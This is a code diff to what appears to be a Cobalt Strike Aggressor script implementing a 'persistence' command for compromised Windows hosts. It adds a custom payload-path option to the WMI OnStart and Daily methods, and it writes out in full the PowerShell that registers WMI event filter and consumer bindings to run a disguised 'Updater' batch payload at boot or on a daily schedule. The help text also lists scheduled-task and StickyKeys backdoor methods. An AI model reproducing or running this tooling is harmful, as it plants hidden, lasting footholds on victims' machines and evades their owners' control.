@@ -33,7 +33,7 @@ alias persistence {
                     addWMIOnStart($1,$2,$3,$4,$5,$6);
                 }
                 else if ($4 eq "Daily"){
-                    addWMIDaily($1,$2,$3,$4,$5,$6,$7);
+                    addWMIDaily($1,$2,$3,$4,$5,$6,$7,$8);
                 }
                 else {
                     berror($1, "Specifiy OnStart or Daily.");
@@ -398,9 +398,13 @@ sub addWMIOnStart {
             $payloadName = "Updater";
             $taskName = "Updater";
         }
+        if ($6) {
+            $payloadPath = $6 . $payloadName . ".bat";
+        }
+        else {
+            $payloadPath = "C:\\Windows\\System32\\" . $payloadName . ".bat";
+        }
 
-        $payloadPath = "C:\\Windows\\System32\\" . $payloadName . ".bat";
- 
         $powershellcmd = "\$Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments @{name='" . $taskName ."';EventNameSpace='root\\CimV2';QueryLanguage=\"WQL\";Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 320\"};\$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace \"root\\subscription\" -Arguments @{Name='" . $taskName . "';ExecutablePath='" . $payloadPath ."';CommandLineTemplate ='" . $payloadPath . "'};Set-WmiInstance -Namespace \"root\\subscription\" -Class __FilterToConsumerBinding -Arguments @{Filter=\$Filter;Consumer=\$Consumer};";
 
         bpowershell($1,$powershellcmd);
@@ -420,8 +424,12 @@ sub remWMIOnStart {
             $payloadName = "Updater";
             $taskName = "Updater";
         }
-        
-        $payloadPath = "C:\\Windows\\System32\\" . $payloadName . ".bat";
+        if ($6) {
+            $payloadPath = $6 . $payloadName . ".bat";
+        }
+        else {
+            $payloadPath = "C:\\Windows\\System32\\" . $payloadName . ".bat";
+        }        
 
         $powershellcmd = "Get-WmiObject __eventFilter -namespace root\\subscription -filter \"name='" . $taskName . "'\"| Remove-WmiObject;Get-WmiObject CommandLineEventConsumer -Namespace root\\subscription -filter \"name='" . $taskName . "'\" | Remove-WmiObject; Get-WmiObject __FilterToConsumerBinding -Namespace root\\subscription | Where-Object { \$_.filter -match '" . $taskName . "'} | Remove-WmiObject;";
         bpowershell($1,$powershellcmd);
@@ -441,7 +449,6 @@ sub addWMIDaily {
             berror($1, "Specify Hour, Minute"); 
             return;  
      }
-    
         if ($7) {
             $payloadName = $7;
             $taskName = $7;
@@ -450,7 +457,12 @@ sub addWMIDaily {
             $payloadName = "Updater";
             $taskName = "Updater";
         }
-        $payloadPath = "C:\\Windows\\System32\\" . $payloadName . ".bat";
+        if ($8) {
+            $payloadPath = $8 . $payloadName . ".bat";
+        }
+        else {
+            $payloadPath = "C:\\Windows\\System32\\" . $payloadName . ".bat";
+        }
 
         $powershellcmd = "\$Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments @{name='" . $taskName ."';EventNameSpace='root\\CimV2';QueryLanguage=\"WQL\";Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour ='" . $taskHour ."' AND TargetInstance.Minute ='" . $taskMinute . "' GROUP WITHIN 60\"};\$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace \"root\\subscription\" -Arguments @{Name='" . $taskName . "';ExecutablePath='" . $payloadPath ."';CommandLineTemplate ='" . $payloadPath . "'};Set-WmiInstance -Namespace \"root\\subscription\" -Class __FilterToConsumerBinding -Arguments @{Filter=\$Filter;Consumer=\$Consumer};";
 
@@ -471,8 +483,13 @@ sub remWMIDaily {
             $payloadName = "Updater";
             $taskName = "Updater";
         }
+        if ($6) {
+            $payloadPath = $6 . $payloadName . ".bat";
+        }
+        else {
+            $payloadPath = "C:\\Windows\\System32\\" . $payloadName . ".bat";
 
-        $payloadPath = "C:\\Windows\\System32\\" . $payloadName . ".bat";
+        }        
 
         $powershellcmd = "Get-WmiObject __eventFilter -namespace root\\subscription -filter \"name='" . $taskName . "'\"| Remove-WmiObject;Get-WmiObject CommandLineEventConsumer -Namespace root\\subscription -filter \"name='" . $taskName . "'\" | Remove-WmiObject; Get-WmiObject __FilterToConsumerBinding -Namespace root\\subscription | Where-Object { \$_.filter -match '" . $taskName . "'} | Remove-WmiObject;";
         bpowershell($1,$powershellcmd);
@@ -580,8 +597,8 @@ Available methods:
     SchTasks OnTime [Hourly | Daily | Weekly | Monthly] <payload / task name>
     *SchTasks OnStart <payload / task name>
     *SchTasks OnLogon <payload / task name>
-    *WMI OnStart <payload / task name>
-    *WMI Daily [Hour] [Minute] <payload / task name>
+    *WMI OnStart <payload / task name> <path of payload>
+    *WMI Daily [Hour] [Minute] <payload / task name> <path of payload>
     **linkinfo
     *StickyKeys <payload / key name>
 
